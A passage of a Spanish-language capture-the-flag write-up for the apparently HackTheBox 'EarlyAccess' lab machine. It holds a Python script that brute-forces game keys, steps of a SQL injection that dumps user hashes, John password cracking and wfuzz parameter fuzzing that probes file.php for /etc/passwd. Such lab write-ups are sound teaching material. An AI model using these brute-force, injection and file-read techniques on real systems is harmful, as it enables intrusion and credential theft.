<span id="cb7-18"><a href="#cb7-18" aria-hidden="true"></a>  </span>
<span id="cb7-19"><a href="#cb7-19" aria-hidden="true"></a><span class="kw">def</span> Login():  </span>
<span id="cb7-20"><a href="#cb7-20" aria-hidden="true"></a>    url_login <span class="op">=</span> <span class="st">&quot;https://earlyaccess.htb/login&quot;</span>  </span>
<span id="cb7-21"><a href="#cb7-21" aria-hidden="true"></a>  </span>
<span id="cb7-22"><a href="#cb7-22" aria-hidden="true"></a>    r <span class="op">=</span> s.get(url_login, verify<span class="op">=</span><span class="va">False</span>)  </span>
<span id="cb7-23"><a href="#cb7-23" aria-hidden="true"></a>  </span>
<span id="cb7-24"><a href="#cb7-24" aria-hidden="true"></a>    token <span class="op">=</span> re.findall(<span class="st">&#39;name=&quot;_token&quot; value=&quot;(.*?)&quot;&#39;</span>,r.text)[<span class="dv">0</span>]  </span>
<span id="cb7-25"><a href="#cb7-25" aria-hidden="true"></a>  </span>
<span id="cb7-26"><a href="#cb7-26" aria-hidden="true"></a>    data_post <span class="op">=</span> {  </span>
<span id="cb7-27"><a href="#cb7-27" aria-hidden="true"></a>        <span class="st">&#39;_token&#39;</span>: token,  </span>
<span id="cb7-28"><a href="#cb7-28" aria-hidden="true"></a>        <span class="st">&#39;email&#39;</span>: email,  </span>
<span id="cb7-29"><a href="#cb7-29" aria-hidden="true"></a>        <span class="st">&#39;password&#39;</span>: password  </span>
<span id="cb7-30"><a href="#cb7-30" aria-hidden="true"></a>    }  </span>
<span id="cb7-31"><a href="#cb7-31" aria-hidden="true"></a>  </span>
<span id="cb7-32"><a href="#cb7-32" aria-hidden="true"></a>    r <span class="op">=</span> s.post(url_login, data<span class="op">=</span>data_post, verify<span class="op">=</span><span class="va">False</span>)  </span>
<span id="cb7-33"><a href="#cb7-33" aria-hidden="true"></a>  </span>
<span id="cb7-34"><a href="#cb7-34" aria-hidden="true"></a>  </span>
<span id="cb7-35"><a href="#cb7-35" aria-hidden="true"></a><span class="kw">def</span> calc_g3():  </span>
<span id="cb7-36"><a href="#cb7-36" aria-hidden="true"></a>    r <span class="op">=</span> product(string.ascii_uppercase, repeat<span class="op">=</span><span class="dv">2</span>)  </span>
<span id="cb7-37"><a href="#cb7-37" aria-hidden="true"></a>  </span>
<span id="cb7-38"><a href="#cb7-38" aria-hidden="true"></a>    r2 <span class="op">=</span> [ <span class="st">&quot;&quot;</span>.join(x) <span class="cf">for</span> x <span class="kw">in</span> r ]  </span>
<span id="cb7-39"><a href="#cb7-39" aria-hidden="true"></a>  </span>
<span id="cb7-40"><a href="#cb7-40" aria-hidden="true"></a>  </span>
<span id="cb7-41"><a href="#cb7-41" aria-hidden="true"></a>    com <span class="op">=</span> {}  </span>
<span id="cb7-42"><a href="#cb7-42" aria-hidden="true"></a>  </span>
<span id="cb7-43"><a href="#cb7-43" aria-hidden="true"></a>    <span class="cf">for</span> x <span class="kw">in</span> r2:  </span>
<span id="cb7-44"><a href="#cb7-44" aria-hidden="true"></a>        <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>,<span class="dv">10</span>):  </span>
<span id="cb7-45"><a href="#cb7-45" aria-hidden="true"></a>            key <span class="op">=</span> <span class="ss">f&quot;XP</span><span class="sc">{x}{i}</span><span class="ss">&quot;</span>  </span>
<span id="cb7-46"><a href="#cb7-46" aria-hidden="true"></a>  </span>
<span id="cb7-47"><a href="#cb7-47" aria-hidden="true"></a>            value <span class="op">=</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(key.encode()))  </span>
<span id="cb7-48"><a href="#cb7-48" aria-hidden="true"></a>  </span>
<span id="cb7-49"><a href="#cb7-49" aria-hidden="true"></a>            com[value] <span class="op">=</span> key  </span>
<span id="cb7-50"><a href="#cb7-50" aria-hidden="true"></a>  </span>
<span id="cb7-51"><a href="#cb7-51" aria-hidden="true"></a>    <span class="cf">return</span> com.values()  </span>
<span id="cb7-52"><a href="#cb7-52" aria-hidden="true"></a>  </span>
<span id="cb7-53"><a href="#cb7-53" aria-hidden="true"></a>  </span>
<span id="cb7-54"><a href="#cb7-54" aria-hidden="true"></a><span class="kw">def</span> checksum_calc(key):  </span>
<span id="cb7-55"><a href="#cb7-55" aria-hidden="true"></a>    gs <span class="op">=</span> key.split(<span class="st">&#39;-&#39;</span>)[:]  </span>
<span id="cb7-56"><a href="#cb7-56" aria-hidden="true"></a>    <span class="cf">return</span> <span class="bu">sum</span>([<span class="bu">sum</span>(<span class="bu">bytearray</span>(g.encode())) <span class="cf">for</span> g <span class="kw">in</span> gs])  </span>
<span id="cb7-57"><a href="#cb7-57" aria-hidden="true"></a>  </span>
<span id="cb7-58"><a href="#cb7-58" aria-hidden="true"></a><span class="kw">def</span> Key_Gen():  </span>
<span id="cb7-59"><a href="#cb7-59" aria-hidden="true"></a>    values <span class="op">=</span> calc_g3()  </span>
<span id="cb7-60"><a href="#cb7-60" aria-hidden="true"></a>  </span>
<span id="cb7-61"><a href="#cb7-61" aria-hidden="true"></a>    total_keys <span class="op">=</span> []  </span>
<span id="cb7-62"><a href="#cb7-62" aria-hidden="true"></a>  </span>
<span id="cb7-63"><a href="#cb7-63" aria-hidden="true"></a>    <span class="cf">for</span> x <span class="kw">in</span> values:  </span>
<span id="cb7-64"><a href="#cb7-64" aria-hidden="true"></a>        key <span class="op">=</span> <span class="ss">f&quot;KEY98-KY5Z3-</span><span class="sc">{x}</span><span class="ss">-GAML8-&quot;</span>  </span>
<span id="cb7-65"><a href="#cb7-65" aria-hidden="true"></a>        cs <span class="op">=</span> checksum_calc(key)  </span>
<span id="cb7-66"><a href="#cb7-66" aria-hidden="true"></a>        key <span class="op">=</span> key <span class="op">+</span> <span class="bu">str</span>(cs)  </span>
<span id="cb7-67"><a href="#cb7-67" aria-hidden="true"></a>  </span>
<span id="cb7-68"><a href="#cb7-68" aria-hidden="true"></a>        total_keys.append(key)  </span>
<span id="cb7-69"><a href="#cb7-69" aria-hidden="true"></a>  </span>
<span id="cb7-70"><a href="#cb7-70" aria-hidden="true"></a>    try_keys(total_keys)  </span>
<span id="cb7-71"><a href="#cb7-71" aria-hidden="true"></a>  </span>
<span id="cb7-72"><a href="#cb7-72" aria-hidden="true"></a><span class="kw">def</span> try_keys(keys):  </span>
<span id="cb7-73"><a href="#cb7-73" aria-hidden="true"></a>  </span>
<span id="cb7-74"><a href="#cb7-74" aria-hidden="true"></a>    p1 <span class="op">=</span> log.progress(<span class="st">&quot;Ataque de fuerza bruta&quot;</span>)  </span>
<span id="cb7-75"><a href="#cb7-75" aria-hidden="true"></a>  </span>
<span id="cb7-76"><a href="#cb7-76" aria-hidden="true"></a>    p1.status(<span class="st">&quot;Iniciando ataque de fuerza bruta...&quot;</span>)  </span>
<span id="cb7-77"><a href="#cb7-77" aria-hidden="true"></a>  </span>
<span id="cb7-78"><a href="#cb7-78" aria-hidden="true"></a>    key_verify_url <span class="op">=</span> <span class="st">&quot;https://earlyaccess.htb/key/add&quot;</span>  </span>
<span id="cb7-79"><a href="#cb7-79" aria-hidden="true"></a>  </span>
<span id="cb7-80"><a href="#cb7-80" aria-hidden="true"></a>    cont <span class="op">=</span> <span class="dv">1</span>  </span>
<span id="cb7-81"><a href="#cb7-81" aria-hidden="true"></a>  </span>
<span id="cb7-82"><a href="#cb7-82" aria-hidden="true"></a>    r <span class="op">=</span> s.get(url_key, verify<span class="op">=</span><span class="va">False</span>)  </span>
<span id="cb7-83"><a href="#cb7-83" aria-hidden="true"></a>  </span>
<span id="cb7-84"><a href="#cb7-84" aria-hidden="true"></a>    token <span class="op">=</span> re.findall(<span class="st">&#39;name=&quot;_token&quot; value=&quot;(.*?)&quot;&#39;</span>,r.text)[<span class="dv">0</span>]  </span>
<span id="cb7-85"><a href="#cb7-85" aria-hidden="true"></a>  </span>
<span id="cb7-86"><a href="#cb7-86" aria-hidden="true"></a>  </span>
<span id="cb7-87"><a href="#cb7-87" aria-hidden="true"></a>    <span class="cf">for</span> key <span class="kw">in</span> keys:  </span>
<span id="cb7-88"><a href="#cb7-88" aria-hidden="true"></a>        p1.status(<span class="st">&quot;Probando con la </span><span class="sc">%s</span><span class="st"> de [</span><span class="sc">%d</span><span class="st">/60]&quot;</span> <span class="op">%</span> (key,cont))  </span>
<span id="cb7-89"><a href="#cb7-89" aria-hidden="true"></a>  </span>
<span id="cb7-90"><a href="#cb7-90" aria-hidden="true"></a>        data_post <span class="op">=</span> {  </span>
<span id="cb7-91"><a href="#cb7-91" aria-hidden="true"></a>            <span class="st">&#39;_token&#39;</span>: token,  </span>
<span id="cb7-92"><a href="#cb7-92" aria-hidden="true"></a>            <span class="st">&#39;key&#39;</span>: key  </span>
<span id="cb7-93"><a href="#cb7-93" aria-hidden="true"></a>        }  </span>
<span id="cb7-94"><a href="#cb7-94" aria-hidden="true"></a>  </span>
<span id="cb7-95"><a href="#cb7-95" aria-hidden="true"></a>        r <span class="op">=</span> s.post(key_verify_url, verify<span class="op">=</span><span class="va">False</span>, data<span class="op">=</span>data_post)  </span>
<span id="cb7-96"><a href="#cb7-96" aria-hidden="true"></a>  </span>
<span id="cb7-97"><a href="#cb7-97" aria-hidden="true"></a>        <span class="cf">if</span> <span class="st">&quot;Game-key is invalid!&quot;</span> <span class="kw">not</span> <span class="kw">in</span> r.text:  </span>
<span id="cb7-98"><a href="#cb7-98" aria-hidden="true"></a>            p1.status(<span class="st">&quot;La key </span><span class="sc">%s</span><span class="st"> ha sido registrada con exito&quot;</span> <span class="op">%</span> key)  </span>
<span id="cb7-99"><a href="#cb7-99" aria-hidden="true"></a>            <span class="cf">break</span>  </span>
<span id="cb7-100"><a href="#cb7-100" aria-hidden="true"></a>  </span>
<span id="cb7-101"><a href="#cb7-101" aria-hidden="true"></a>        cont <span class="op">+=</span> <span class="dv">1</span>  </span>
<span id="cb7-102"><a href="#cb7-102" aria-hidden="true"></a>  </span>
<span id="cb7-103"><a href="#cb7-103" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:  </span>
<span id="cb7-104"><a href="#cb7-104" aria-hidden="true"></a>    Login()  </span>
<span id="cb7-105"><a href="#cb7-105" aria-hidden="true"></a>  </span>
<span id="cb7-106"><a href="#cb7-106" aria-hidden="true"></a>    Key_Gen()</span></code></pre></div>
<p>Lo primero que hace el script es acceder como el usuario existente para guardar la sesión y luego en la función <strong>calc_g3</strong> calcula la tercera parte de la clave creando un diccionario para añadir todas las posibilidades.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="kw">def</span> calc_g3():  </span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a>    r <span class="op">=</span> product(string.ascii_uppercase, repeat<span class="op">=</span><span class="dv">2</span>)  </span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a>  </span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a>    r2 <span class="op">=</span> [ <span class="st">&quot;&quot;</span>.join(x) <span class="cf">for</span> x <span class="kw">in</span> r ]  </span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a>  </span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true"></a>    com <span class="op">=</span> {}  </span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true"></a>  </span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true"></a>    <span class="cf">for</span> x <span class="kw">in</span> r2:  </span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true"></a>        <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>,<span class="dv">10</span>):  </span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true"></a>            key <span class="op">=</span> <span class="ss">f&quot;XP</span><span class="sc">{x}{i}</span><span class="ss">&quot;</span>  </span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true"></a>  </span>
<span id="cb8-12"><a href="#cb8-12" aria-hidden="true"></a>            value <span class="op">=</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(key.encode()))  </span>
<span id="cb8-13"><a href="#cb8-13" aria-hidden="true"></a>  </span>
<span id="cb8-14"><a href="#cb8-14" aria-hidden="true"></a>            com[value] <span class="op">=</span> key  </span>
<span id="cb8-15"><a href="#cb8-15" aria-hidden="true"></a>  </span>
<span id="cb8-16"><a href="#cb8-16" aria-hidden="true"></a>    <span class="cf">return</span> com.values()  </span></code></pre></div>
<p>Luego de eso realiza la suma para calcular el <strong>checksum</strong> para así guardar todas las variantes en la lista <strong>total_keys</strong>.</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="kw">def</span> checksum_calc(key):  </span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>    gs <span class="op">=</span> key.split(<span class="st">&#39;-&#39;</span>)[:]  </span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>    <span class="cf">return</span> <span class="bu">sum</span>([<span class="bu">sum</span>(<span class="bu">bytearray</span>(g.encode())) <span class="cf">for</span> g <span class="kw">in</span> gs])  </span></code></pre></div>
<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="cf">for</span> x <span class="kw">in</span> values:  </span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a>        key <span class="op">=</span> <span class="ss">f&quot;KEY98-KY5Z3-</span><span class="sc">{x}</span><span class="ss">-GAML8-&quot;</span>  </span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>        cs <span class="op">=</span> checksum_calc(key)  </span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>        key <span class="op">=</span> key <span class="op">+</span> <span class="bu">str</span>(cs)  </span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>  </span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>        total_keys.append(key)  </span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a>  </span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>    try_keys(total_keys)  </span></code></pre></div>
<p>Para finalmente enviar todas las variantes a la parte del registro de claves, hasta enviar la verdadera.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="cf">for</span> key <span class="kw">in</span> keys:  </span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a>        p1.status(<span class="st">&quot;Probando con la </span><span class="sc">%s</span><span class="st"> de [</span><span class="sc">%d</span><span class="st">/60]&quot;</span> <span class="op">%</span> (key,cont))  </span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a>  </span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a>        data_post <span class="op">=</span> {  </span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true"></a>            <span class="st">&#39;_token&#39;</span>: token,  </span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true"></a>            <span class="st">&#39;key&#39;</span>: key  </span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true"></a>        }  </span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true"></a>  </span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true"></a>        r <span class="op">=</span> s.post(key_verify_url, verify<span class="op">=</span><span class="va">False</span>, data<span class="op">=</span>data_post)  </span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true"></a>  </span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true"></a>        <span class="cf">if</span> <span class="st">&quot;Game-key is invalid!&quot;</span> <span class="kw">not</span> <span class="kw">in</span> r.text:  </span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true"></a>            p1.status(<span class="st">&quot;La key </span><span class="sc">%s</span><span class="st"> ha sido registrada con exito&quot;</span> <span class="op">%</span> key)  </span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true"></a>            <span class="cf">break</span>  </span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true"></a>  </span>
<span id="cb11-15"><a href="#cb11-15" aria-hidden="true"></a>        cont <span class="op">+=</span> <span class="dv">1</span>      </span></code></pre></div>
<p>Al ejecutar el script podemos ver la verdadera clave</p>
<img src="Img/Pasted image 20240512211411.png">
<p>Teniendo ya la clave canjeada, vemos que ahora nos aparece una pestaña que nos redirige al subdominio <strong>game.earlyaccess.htb</strong></p>
<img src="Img/Pasted image 20240512213443.png">
<img src="Img/Pasted image 20240513082429.png">
<img src="Img/Pasted image 20240513082617.png">
<p>Si jugamos al juego Snake, en la pestaña <strong>Scoreboard</strong> vemos la puntuación.</p>
<img src="Img/Pasted image 20240513082708.png">
<p>Recordando que había un usuario el cual el nombre de usuario arroja errores extraños, probamos a poner una comilla simple <strong>’</strong> a nuestro nombre de usuario.</p>
<img src="Img/Pasted image 20240513083626.png">
<p>Al volver al marcado vemos un error de SQL, sabiendo esto ya sabemos que hay un <strong>SQL injection</strong>.</p>
<img src="Img/Pasted image 20240513083638.png">
<p>Vemos que lo esta encapsulando con un paréntesis <strong>)</strong>.</p>
<img src="Img/Pasted image 20240513083859.png">
<p>Por tanto lo añadimos al nombre de usuario.</p>
<img src="Img/Pasted image 20240513084112.png">
<p>Ahora no nos sale nada.</p>
<img src="Img/Pasted image 20240513084415.png">
<p>Tratando de averiguar el nombre de columnas totales de la consulta, nos sale un error al introducir un ordenamiento por la columna numero 4.</p>
<img src="Img/Pasted image 20240513084521.png">
<img src="Img/Pasted image 20240513084535.png">
<p>Con esto, ya sabemos que el numero de columnas que hay son <strong>3</strong>.</p>
<img src="Img/Pasted image 20240513084620.png">
<img src="Img/Pasted image 20240513084633.png">
<p>Vamos a ver, todas las bases de datos que existentes.</p>
<img src="Img/Pasted image 20240513094249.png">
<img src="Img/Pasted image 20240513094255.png">
<p>Tenemos 2 <strong>information_schema</strong> y <strong>db</strong>, por razones lógicas vamos a ver las tablas de la base de datos <strong>db</strong>.</p>
<img src="Img/Pasted image 20240513094354.png">
<img src="Img/Pasted image 20240513094400.png">
<p>Vemos que la base de datos <strong>db</strong> tiene 3 tablas: <strong>failed_logins</strong>, <strong>scoreboard</strong>, y <strong>users</strong>.</p>
<p>Sabiendo esto miraremos las columnas de la tabla <strong>users</strong>, para tratar de conseguir credenciales que nos sean útiles.</p>
<img src="Img/Pasted image 20240513094631.png">
<img src="Img/Pasted image 20240513094636.png">
<p>Ya sabiendo las columnas vamos a averiguar los datos de las columnas <strong>name</strong>, <strong>email</strong> y <strong>password</strong>.</p>
<img src="Img/Pasted image 20240513094726.png">
<img src="Img/Pasted image 20240513094751.png">
<p>Vemos todas las contraseña de los usuarios de la pagina, pero todas esa hacheadas, por lo que vamos a utilizar la herramienta <strong>john</strong> para poder averiguar los hashes.</p>
<img src="Img/Pasted image 20240513101946.png">
<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a>❯ <span class="ex">john</span> -w=/usr/share/wordlists/rockyou.txt hashes</span></code></pre></div>
<table>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-w</td>
<td>Indica el diccionario que se utilizara</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="ex">Warning</span>: detected hash type <span class="st">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="st">&quot;Raw-SHA1-AxCrypt&quot;</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that type instead</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a><span class="ex">Warning</span>: detected hash type <span class="st">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="st">&quot;Raw-SHA1-Linkedin&quot;</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA1-Linkedin&quot;</span> option to force loading these as that type instead</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a><span class="ex">Warning</span>: detected hash type <span class="st">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="st">&quot;ripemd-160&quot;</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=ripemd-160&quot;</span> option to force loading these as that type instead</span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true"></a><span class="ex">Warning</span>: detected hash type <span class="st">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="st">&quot;has-160&quot;</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=has-160&quot;</span> option to force loading these as that type instead</span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true"></a><span class="ex">Using</span> default input encoding: UTF-8</span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true"></a><span class="ex">Loaded</span> 4 password hashes with no different salts (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true"></a><span class="ex">Warning</span>: no OpenMP support for this hash type, consider --fork=6</span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true"></a><span class="ex">Press</span> <span class="st">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true"></a><span class="ex">gameover</span>         (admin)</span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true"></a><span class="ex">Warning</span>: Only 5 candidates left, minimum 8 needed for performance.</span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true"></a><span class="ex">1g</span> 0:00:00:01 DONE (2024-05-13 10:20) <span class="ex">0.7936g/s</span> 11383Kp/s 11383Kc/s 34155KC/s xCvBnM,..*7¡Vamos!</span>
<span id="cb13-16"><a href="#cb13-16" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true"></a><span class="ex">Session</span> completed</span></code></pre></div>
<p>Vemos que la contraseña del usuario <strong>admin</strong> es <strong>gameover</strong>.</p>
<p>Si accedemos de nuevo al dominio <strong>dev.earlyaccess.htb</strong> donde pedía la contraseña del usuario <strong>admin</strong> y ponemos la contraseña descubierta, vemos que es la correcta.</p>
<img src="Img/Pasted image 20240513102415.png">
<img src="Img/Pasted image 20240513102424.png">
<p>Al acceder a la pestaña <strong>Hashing-Tools</strong> nos aparece un generador de hashes.</p>
<img src="Img/Pasted image 20240513104110.png">
<img src="Img/Pasted image 20240513102446.png">
<p>Si tramitamos la petición con <strong>BurpSuite</strong> vemos lo siguiente.</p>
<img src="Img/Pasted image 20240513104258.png">
<img src="Img/Pasted image 20240513104501.png">
<p>Al interceptar la petición vemos que se tramita a la ruta <strong>/actions/</strong>.</p>
<p>Utilizamos la herramienta <strong>wfuzz</strong> para descubrir los archivos que contenga el directorio <strong>/actions</strong>.</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>❯ <span class="ex">wfuzz</span> --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt <span class="st">&quot;http://dev.earlyaccess.htb/actions/FUZZ.php&quot;</span></span></code></pre></div>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 90%" />
</colgroup>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>–hc=404</td>
<td>Oculto los resultas cuyo código de estado sea 404.</td>
</tr>
<tr class="even">
<td>-t 200</td>
<td>Indica que se utilicen 200 subprocesos simultáneamente para aumentar la velocidad de descubrimiento.</td>
</tr>
<tr class="odd">
<td>-w</td>
<td>Indica el diccionario que se utilizara</td>
</tr>
<tr class="even">
<td>FUZZ</td>
<td>Indica en que parte de la URL se realizara el descubrimiento.</td>
</tr>
</tbody>
</table>
<p>Vemos un archivo con el nombre <strong>file</strong>.</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a> <span class="ex">/usr/lib/python3/dist-packages/wfuzz</span>/__init__.py:<span class="ex">34</span>: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="st">&#39;s documentation for more information.</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a><span class="st">********************************************************</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a><span class="st">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a><span class="st">********************************************************</span></span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true"></a></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true"></a><span class="st">Target: http://dev.earlyaccess.htb/actions/FUZZ.php</span></span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true"></a><span class="st">Total requests: 6453</span></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true"></a></span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true"></a><span class="st">=====================================================================</span></span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true"></a><span class="st">ID           Response   Lines    Word       Chars       Payload                                                                                                                </span></span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true"></a><span class="st">=====================================================================</span></span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true"></a></span>
<span id="cb15-13"><a href="#cb15-13" aria-hidden="true"></a><span class="st">000002206:   500        0 L      3 W        35 Ch       &quot;file&quot;                                                                                                                 </span></span>
<span id="cb15-14"><a href="#cb15-14" aria-hidden="true"></a><span class="st">000002577:   302        0 L      0 W        0 Ch        &quot;hash&quot;                                                                                                                 </span></span>
<span id="cb15-15"><a href="#cb15-15" aria-hidden="true"></a><span class="st">000003206:   302        0 L      0 W        0 Ch        &quot;login&quot;                                                                                                                </span></span>
<span id="cb15-16"><a href="#cb15-16" aria-hidden="true"></a><span class="st">000003217:   302        0 L      0 W        0 Ch        &quot;logout&quot;                                                                                                               </span></span>
<span id="cb15-17"><a href="#cb15-17" aria-hidden="true"></a></span>
<span id="cb15-18"><a href="#cb15-18" aria-hidden="true"></a><span class="st">Total time: 0</span></span>
<span id="cb15-19"><a href="#cb15-19" aria-hidden="true"></a><span class="st">Processed Requests: 6453</span></span>
<span id="cb15-20"><a href="#cb15-20" aria-hidden="true"></a><span class="st">Filtered Requests: 6449</span></span>
<span id="cb15-21"><a href="#cb15-21" aria-hidden="true"></a><span class="st">Requests/sec.: 0</span></span></code></pre></div>
<p>Al acceder vemos un texto donde pone que especifiquemos un archivo.</p>
<img src="Img/Pasted image 20240513105742.png">
<p>Si probamos posibles parámetros vemos el <strong>filepath</strong>.</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a>❯ <span class="ex">wfuzz</span> --hh=35 --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt <span class="st">&quot;http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd&quot;</span></span></code></pre></div>
<table>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>–hh=35</td>
<td>Oculta los resultas que tengan 35 caracteres.</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a> <span class="ex">/usr/lib/python3/dist-packages/wfuzz</span>/__init__.py:<span class="ex">34</span>: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="st">&#39;s documentation for more information.</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a><span class="st">********************************************************</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a><span class="st">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a><span class="st">********************************************************</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true"></a></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true"></a><span class="st">Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/hosts</span></span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true"></a><span class="st">Total requests: 6453</span></span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true"></a></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true"></a><span class="st">=====================================================================</span></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true"></a><span class="st">ID           Response   Lines    Word       Chars       Payload                                                                                                                </span></span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true"></a><span class="st">=====================================================================</span></span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true"></a></span>
